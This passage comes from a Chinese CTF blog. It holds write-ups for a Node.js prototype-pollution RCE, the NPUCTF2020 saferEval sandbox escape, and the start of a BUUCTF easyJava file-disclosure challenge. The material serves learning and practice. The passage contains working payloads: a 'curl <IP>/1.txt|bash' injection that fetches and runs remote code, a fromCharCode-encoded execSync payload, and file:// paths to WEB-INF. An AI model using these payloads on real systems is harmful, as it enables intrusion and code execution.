class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.route(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> id = req.body.id;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.remove_note(id);<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.route(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> q = req.query.q;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.get_all_notes();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.get_note(q);<br>        &#125;<br>        res.render(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.route(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            exec(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.send(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.end();<br>    &#125;)<br><br>app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br>app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>&#123;<br>  <span class="hljs-built_in">console</span>.error(err.stack);<br>  res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.listen(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br><br></code></pre></td></tr></table></figure><p>问题出在 <code>/status</code> 路由</p><p>如果可以污染 commands参数，就达到了一个rce的效果</p><p>通读代码 Notes 有三个属性  <code>note_list,num,owner</code></p><p>editnote需要传入三个参数</p><p>简单看一个 原型链污染的脚本 链接我贴下面了 NODE_VERSION &lt; 2.0.3</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;this is &#x27;</span>+test)<br><span class="hljs-comment">// this is [object Object]</span><br>a(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;this is &#x27;</span>+test)<br><span class="hljs-comment">// this is just a evil!</span><br></code></pre></td></tr></table></figure><p>​    这是由于 <code>__proto__</code> 是函数的原型对象，当我们访问不存在的属性时，它就会往它上一级的 <code>__proto__</code> 寻找，这个时候如果我们控制了它的上一级 <code>__proto__</code> 那么也就控制了 被控对象的某个属性。</p><p>​    对于这题，<code>edit_note</code> 有三个参数，满足上面 第二，三个参数可控 污染第一个参数的实例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后按照上面的顺序构造</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=__proto__&amp;author=curl 81.70.36.48/1.txt|bash&amp;<span class="hljs-attribute">raw</span>=123<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203171931586.png" alt="image-20220317193152479"></p><p>然后访问 <code>/status</code> 目录即可</p><h3 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h3><p>膜 feng 的第n天</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieSession = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-session&#x27;</span>);<br><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./key.js&#x27;</span>).keys;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> crypto.createHash(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .update(s)<br>    .digest(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saferEval</span>(<span class="hljs-params">str</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (str.replace(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>  <span class="hljs-comment">// g 全局替換</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str);<br>&#125; <span class="hljs-comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span><br><br><span class="hljs-keyword">const</span> template = fs.readFileSync(<span class="hljs-string">&#x27;./index.html&#x27;</span>).toString();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params">results</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> template.replace(<span class="hljs-string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>));<br>&#125;<br><br><span class="hljs-keyword">const</span> app = express();<br><br>app.use(bodyParser.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.use(bodyParser.json());<br><br>app.use(cookieSession(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;PHPSESSION&#x27;</span>, <span class="hljs-comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span><br>  keys<br>&#125;));<br><br><span class="hljs-built_in">Object</span>.freeze(<span class="hljs-built_in">Object</span>);<br><span class="hljs-built_in">Object</span>.freeze(<span class="hljs-built_in">Math</span>);<br><br>app.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> results = req.session.results || [];<br>  <span class="hljs-keyword">const</span> &#123; e, first, second &#125; = req.body;<br>  <span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="hljs-number">0</span>]) === md5(second+keys[<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (req.body.e) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        result = saferEval(req.body.e) || <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-built_in">console</span>.log(e);<br>        result = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125;<br>      results.unshift(<span class="hljs-string">`<span class="hljs-subst">$&#123;req.body.e&#125;</span>=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    results.unshift(<span class="hljs-string">&#x27;Not verified!&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (results.length &gt; <span class="hljs-number">13</span>) &#123;<br>    results.pop();<br>  &#125;<br>  req.session.results = results;<br>  res.send(render(req.session.results));<br>&#125;);<br><br><span class="hljs-comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span><br>app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);<br>  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./index.js&#x27;</span>));<br>&#125;);<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);<br>  req.session.admin = req.session.admin || <span class="hljs-number">0</span>;<br>  res.send(render(req.session.results = req.session.results || []))<br>&#125;);<br><br>app.listen(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Start listening&#x27;</span>)<br>&#125;);<br></code></pre></td></tr></table></figure><p>line 46 的if判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="hljs-number">0</span>]) === md5(second+keys[<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (req.body.e) &#123; <span class="hljs-comment">//带上这个吧...</span><br></code></pre></td></tr></table></figure><p>这里 nodejs 有一个特性 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> array = [<span class="hljs-number">1</span>];<br><span class="hljs-keyword">var</span> str1 = <span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-built_in">console</span>.log(array+str1);<br><span class="hljs-built_in">console</span>.log(array+<span class="hljs-number">1</span>);<br><span class="hljs-built_in">console</span>.log(str1+str1);<br><span class="hljs-comment">/*output:</span><br><span class="hljs-comment">11</span><br><span class="hljs-comment">11</span><br><span class="hljs-comment">11</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>事实上，似乎只要在console中调用了 和 字符串拼接的 功能 类型就会自动转为 String</p><p>这样 可以令 <code>first=1&amp;second=[1]</code> 不要忘了 还有 对 e 的判断,组合一下</p><p><code>e=D3n13d&amp;first=1&amp;second=[1]</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">app.use(bodyParser.json());<br></code></pre></td></tr></table></figure><p>加上这行解析json格式的数据</p><p><code>e=D3n13d&amp;first=1&amp;second=[1]</code> &#x3D;&gt; <code>&#123;&quot;e&quot;:D3n13d,&quot;first&quot;:1,&quot;second&quot;:[1]&#125;</code></p><p>然后来溜这个正则</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saferEval</span>(<span class="hljs-params">str</span>) </span>&#123;<br>      <span class="hljs-keyword">if</span> (str.replace(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这个正则真的厉害了直接cp feng 的描述了</p><blockquote><p>看一下这个正则，第一部分是类似<code>Math.xxx</code>或只有<code>Math</code>这样的的，第二部分是可以包括这些字符：<br><code>[()+\-*/&amp;|^%&lt;&gt;=,?:</code><br>第三部分是以一定数字开头，然后跟0或者1个点，然后任意的数字，然后0或者一个类似<code>e1111</code>这样的。感觉这是整数，浮点数和科学计数法。</p><p><a href="https://blog.csdn.net/rfrder/article/details/115406785">https://blog.csdn.net/rfrder/article/details/115406785</a></p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203180046250.png" alt="image-20220318004634156"></p><p>可以看到 <code>Math.constructor.constructor</code> 有 Function 可以利用</p><p>由上面的 对字符的限制 可以联想到 使用 数字 转 字符这样的操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">Math</span>=<span class="hljs-built_in">Math</span>.constructor,<br><span class="hljs-built_in">Math</span>.constructor(<span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;).toString()&quot;</span>)()<br></code></pre></td></tr></table></figure><p>​                                                                             | |</p><p>​                                                                              ˇ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>    (<span class="hljs-built_in">Math</span>=<span class="hljs-built_in">Math</span>.constructor,<br>            <span class="hljs-built_in">Math</span>.constructor(<br>                <span class="hljs-built_in">Math</span>.fromCharCode(<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">110</span>,<span class="hljs-number">32</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<br>                    <span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">46</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">77</span>,<span class="hljs-number">111</span>,<span class="hljs-number">100</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<br>                    <span class="hljs-number">46</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">113</span>,<span class="hljs-number">117</span>,<span class="hljs-number">105</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,<br>                    <span class="hljs-number">95</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">83</span>,<br>                    <span class="hljs-number">121</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>))()<br>    )<br>)(<span class="hljs-built_in">Math</span>+<span class="hljs-number">1</span>)<br><span class="hljs-comment">//   (()=&gt;())()  定义一个Math 函数 Math+1 作为参数 满足 MD5 == 然后 经过 两次 constructor 调用 Function</span><br></code></pre></td></tr></table></figure><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203180055535.png" alt="image-20220318005543479" style="zoom:150%;" /><p>关于 <a href="https://blog.csdn.net/weixin_30685029/article/details/101951574">箭头函数</a>  </p><p>最後payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22adcb80-6dec-4163-ba83-afe88616143f.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="dns">&#123;&quot;e&quot;:&quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(<span class="hljs-number">114,101,116,117</span>,<span class="hljs-number">114,110,32,112</span>,<span class="hljs-number">114,111,99,101</span>,<span class="hljs-number">115,115,46,109</span>,<span class="hljs-number">97,105,110,77</span>,<span class="hljs-number">111,100,117,108</span>,<span class="hljs-number">101,46,114,101</span>,<span class="hljs-number">113,117,105,114</span>,<span class="hljs-number">101,40,39,99</span>,<span class="hljs-number">104,105,108,100</span>,<span class="hljs-number">95,112,114,111</span>,<span class="hljs-number">99,101,115,115</span>,<span class="hljs-number">39,41,46,101</span>,<span class="hljs-number">120,101,99,83</span>,<span class="hljs-number">121,110,99,40</span>,<span class="hljs-number">39,99,97,116</span>,<span class="hljs-number">32,47,102,108</span>,<span class="hljs-number">97,103,39,41</span>,<span class="hljs-number">46,116,111,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,40,41</span>))()))(Math+<span class="hljs-number">1</span>)&quot;,&quot;first&quot;:&quot;<span class="hljs-number">1</span>&quot;,&quot;second&quot;:[<span class="hljs-number">1</span>]</span><br><span class="dns">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从Servlet安全问题到反序列化getFlag</title>
    <link href="/2022/03/15/%E4%BB%8EServlet%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%88%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getFlag/"/>
    <url>/2022/03/15/%E4%BB%8EServlet%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%88%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getFlag/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="从Servlet安全问题到反序列化getFlag"><a href="#从Servlet安全问题到反序列化getFlag" class="headerlink" title="从Servlet安全问题到反序列化getFlag"></a>从Servlet安全问题到反序列化getFlag</h1><p>题目来源：BUUCTF easyJava</p><h2 id="文件泄露"><a href="#文件泄露" class="headerlink" title="文件泄露"></a>文件泄露</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203141932628.png" alt="image-20220314193246190"><br>先来一波手动 Baner 收集，几个思路：</p><ul><li>题目名称 easyJava -&gt; tomcat</li><li>经典错误路径看 框架 &#x2F; 引擎</li></ul><p>example:</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203141937426.png" alt="image-20220314193722355"></p><p>然后关注怎么获取源代码？做过JavaWeb的同学一定是很熟悉了，这里补充一下</p><figure class="highlight gradle"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs gradle">WEB-INF主要包含一下文件或目录:<br><span class="hljs-regexp">/WEB-INF/</span>web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br><span class="hljs-regexp">/WEB-INF/</span>classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中<br><span class="hljs-regexp">/WEB-INF/</span>lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br><span class="hljs-regexp">/WEB-INF/</span>src/：源码目录，按照包名结构放置各个java文件。<br><span class="hljs-regexp">/WEB-INF/</span>database.properties：数据库配置文件<br><span class="hljs-regexp">/file?url=file:/</span><span class="hljs-regexp">//u</span>sr<span class="hljs-regexp">/local/</span>tomcat<span class="hljs-regexp">/webapps/</span>ROOT<span class="hljs-regexp">/WEB-INF/</span>web.xml<br><span class="hljs-regexp">/file?url=file:/</span><span class="hljs-regexp">//u</span>sr<span class="hljs-regexp">/local/</span>tomcat<span class="hljs-regexp">/webapps/</span>ROOT<span class="hljs-regexp">/WEB-INF/</span>classes<br></code></pre></td></tr></table></figure><p>由此，根据源代码中的提示，构造</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203141941940.png" alt="image-20220314194102888"></p><p>依次下载其他源码，接下来关注代码层面的问题。</p><h2 id="Servlet多线程安全问题"><a href="#Servlet多线程安全问题" class="headerlink" title="Servlet多线程安全问题"></a>Servlet多线程安全问题</h2><blockquote><p>​    先了解下成因吧，当用户发送Http请求的时候,Tomcat会读取web.xml中的内容，加载所定义的Servlet并实例化该Servlet。Tomcat中Servlet是单例模式（单例类只能有一个实例）的。Servlet可以同时处理多个用户请求，但实际上共享的一个实例同样也会共享内部的成员变量，所以如果出现某一个线程正在修改servlet的实例状态，但是另外一个线程又需要读取servlet的线程状态就会出现线程安全问题。</p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203142125278.png" alt="image-20220314212502213"></p><center>错误的Servlet并发请求处理流程</center><p>样例测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>            System.out.println(threadName+<span class="hljs-string">&quot;  Count:&quot;</span>+count);<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">100</span>);<br>                count ++;<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>-nio-<span class="hljs-number">8080</span>-exec-<span class="hljs-number">5</span>  Count:<span class="hljs-number">5027</span><br><span class="hljs-attribute">http</span>-nio-<span class="hljs-number">8080</span>-exec-<span class="hljs-number">4</span>  Count:<span class="hljs-number">5028</span><br><span class="hljs-attribute">http</span>-nio-<span 